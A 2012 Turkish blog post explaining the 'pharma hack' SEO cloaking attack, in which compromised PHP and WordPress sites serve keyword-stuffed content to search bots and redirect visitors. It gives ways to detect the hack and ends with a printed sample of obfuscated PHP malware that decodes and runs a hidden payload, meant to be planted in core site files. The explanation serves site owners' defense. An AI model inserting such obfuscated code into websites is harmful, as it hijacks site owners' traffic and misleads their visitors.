---
title: "Pharma hack (Google Cloaking Hack) nedir?"
slug: pharma-hack-google-cloaking-hack-nedir
date: 2012-01-02
description: "Pharma Hack (Google Cloaking) nedir, siteleri nasıl etkiler ve nasıl tespit edilir? SEO odaklı bu saldırının WordPress gibi sistemlerdeki tehlikeleri ve korunma yolları."
url: http://mfyz.com/tr/pharma-hack-google-cloaking-hack-nedir/
tags: ["pharma hack", "google cloaking", "seo saldırısı", "site güvenliği", "wordpress", "php", "hack"]
category: Sunucu Programlama
migration: {"wpId":159,"wpPostDate":"2012-01-02T03:09:02.000Z"}
lang: tr
---

#### Pharma hack nedir?

Pharma hack bır çeşit SEO saldırısıdır. Asıl adı Google Cloaking Hack'dır. Sitenizi html çıktısını kullanıcıya göre manipüle etmek üzerine kuruludur. Pharma hack adını genellikle internette cinsel sağlık ürünleri veya besin takviyesi satan şirketlerin bu hack ile trafik kazanmaya çalışmasından almıştır. Yani bu hack sadece sitenizin arama motoru trafiğini kesmez. Tabi siz analitics yazılımlarda bir trafik kaybı görmezsiniz. Sadece bounce rate'iniz her gün yükselir ve dış trafiğiniz artar. Bu da pagerank'ınızı kaybetmeninizi sağlayabilir.

Büyük tehlike ise sitenizin sansürlenmesi. Türkiye'de son dönemde birçok sitenin/blogun sansürlerden dolayı engellendiğini görüyorsunuz. Bu filtreler genelde halka açık ortamlar, eğitim kurumları gibi alanlarda çok daha etkin. Yani zararsız bir siteye sahip olsanız bile bu hack ile MEB ve BTK'nın google indeksleri ile edindiği site bilgisi genelde cinsel sağlık ürünleri olacağı için muhtemelen siz o içeriğe sahip olmasanız bile okullar, internet cafe'ler gibi yerlerden otomatik olarak filtrelenmiş olacaksınız.

#### Nasıl oluyor?

Pharma hack sitenize doğrudan ziyaretle anlayamayacağınız bir saldırıdır. Siteniz doğrudan gelen ziyaretçilere normal çıktısını verir ve tarayıcıda doğrudan sitenize giren insanlar sitenizi görmeye devam ederler, böylece siz de anlamazsınız pharma hack altında olduğunuzu.

Ama arama motoru botları sitenizi taramaya çalıştığı zaman sitenizin hack kodu sitenizin sayfa başlığı, anahtar kelimeleri gibi meta etiketlerini değiştirip sayfa içeriğinde istedikleri anahtar kelimeleri de ekleyerek sitenizin çıktısını manipule eder. Böylece pagerank'ınızı kullanarak arama motorlarından gelen trafiğinizi çalarlar. Böylece sitenize ait tüm google indeksleri bir sonraki güncellemede o anahtar kelimeleri alır. Eğer siteniz yüksek page rankına sahipse o anahtar kelimelerde üst sıralarda çıkar ve kullanıcı linke tıkladıgı zaman sayfanızdaki ufak bir javascript kodu kullanıcıyı başka bir sunucuya yönlendirir. Arama motoru trafiğiniz yanlış içerikle sunulur ve kısaca arama motoru trafiğiniz başka bir siteye yönlendirilir.

#### Sitenizde pharma hack var mı?

Sitenizi sayfaları kontrol ederek pharma hack olup olmadığını anlayamazsınız. Birkaç yolu var;

1) Tarayıcınızın User Agent'ını GoogleBot olarak değiştirip sitenize girebilir, sayfalarınız öyle kontrol edebilirsiniz.

2) Google Webmaster Tools'a kayıt olup sitenizi ekleyip google botun sitenizi nasıl taradığını görebilirsiniz. Googlebot site sitenizin verdiği HTML çıktısını gösterecektir. Meta etiketlerinizi ve sayfa içeriğinizi kontrol edip fakrlı olup olmadığını görebilirsiniz.

#### Ne tür uygulamalarda yapıyorlar?

Benim gördüğüm örnekleri popüler php hostinglerde ya sunucu kontrolünü ele geçirdikten sonra tüm hesaplara ya da sadece sizin hesabınızı ele geçirdilerse sizin hesabınızda yapılan birkaç ufak php numarasıyla sayfalarınızı arama motoru botlarında farklı render etme üzerine kuruludur. Eğer bir wordpress bloguna veya joomla, drupal gibi bir CMS kullanıyorsanız muhtemel olarak tehlike altındasınız demektir çünkü ele geçirilmesi, gizlenmesi en kolay ve hackerların hedef kitlesidir.

Örnek bir pharma hack kodu göstermem gerekirse:
```php
$check_tmg_password_reset_key = 'QN9Mrh7F=4?C!N^NP.NJ16YH6K66G=+BOeHeQ7D?A!"
CMD$JT,UTP@#3kSZ=j8;>?=B5$(v+}k~)tKkwz6puT|_P{-[11):V;Hblc<eyfau+Z4r29[dID2ThIY.E^A|AHcN@E-
woZPd'^'48X!Z(P<TZY/@:;f6G"/nQ<<i(YX3XE6<MjJ9X)ZnLD:7kE.9E;z=&ZIE05PEHZ
PZQmyMJY{5;*h8d;?*b19{,7 Tl/EC@X#O-M<+l18*N[X,Z]FT+K96]$E+8] 
q##t{R\`0+JUFsy_';
$make_ao_site_theme_from_oldschool = '"\`E\`\`e_Fe$"dai.'|'Are!t!Y tncT)oF';

$wp_rzc_newPage = $make_ao_site_theme_from_oldschool('',$check_tmg_password_reset_key);
$wp_rzc_newPage();

```
Bu kod wordpress bloglar için özellikle yazılmış bir pharma hack kodu. Genelde sitenizde her sayfada çalıştırılan bir dosyada yer alırlar. (bootstrap.php, common.php, db.php vs...)